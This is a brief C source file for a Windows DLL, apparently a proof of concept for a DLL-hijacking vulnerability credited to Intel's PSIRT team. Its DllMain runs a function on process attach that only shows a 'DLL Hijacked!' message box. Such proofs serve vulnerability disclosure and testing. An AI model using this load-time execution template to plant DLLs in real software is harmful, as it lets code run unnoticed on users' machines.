#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
   switch (fdwReason)
   {
      case DLL_PROCESS_ATTACH:
      dll_mll();
      case DLL_THREAD_ATTACH:
      case DLL_THREAD_DETACH:
      case DLL_PROCESS_DETACH:
      break;
   }
   return TRUE;
}

int dll_mll()
{   
   MessageBox(0, "DLL Hijacked!", "Intel PSIRT Team", MB_OK | MB_ICONWARNING);
}
